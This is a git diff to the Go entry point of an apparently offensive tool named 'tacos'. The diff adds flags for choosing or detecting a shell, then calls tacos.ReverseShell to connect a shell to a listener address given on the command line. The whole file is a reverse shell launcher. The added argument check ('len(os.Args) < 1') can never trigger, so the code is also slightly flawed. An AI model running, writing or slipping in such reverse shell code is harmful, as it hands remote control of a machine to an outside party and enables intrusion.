@@ -1,16 +1,30 @@
 package main
 
 import (
+	"flag"
+	"fmt"
 	"os"
 
 	"github.com/ariary/tacos/pkg/tacos"
 )
 
-//https://gist.github.com/yougg/b47f4910767a74fcfe1077d21568070e?permalink_comment_id=3425797#gistcomment-3425797
-// and https://github.com/creack/pty#shell
-//https://github.com/iximiuz/ptyme/blob/master/attach.go
 func main() {
-	shell := tacos.DefaultShell()
-	remote := os.Args[1]
+	var detect bool
+	var shell string
+	flag.BoolVar(&detect, "detect", false, "Detect default shell to use it in reverse shell")
+	flag.StringVar(&shell, "shell", "", "shell to use for reverse shell") //default /bin/bash
+	flag.Parse()
+
+	if detect {
+		shell = tacos.DetectDefaultShell()
+	}
+
+	if len(os.Args) < 1 {
+		fmt.Println("Usage: tacos [listener_url]:[port]")
+		os.Exit(1)
+	}
+
+	remote := flag.Arg(0)
+
 	tacos.ReverseShell(remote, shell)
 }
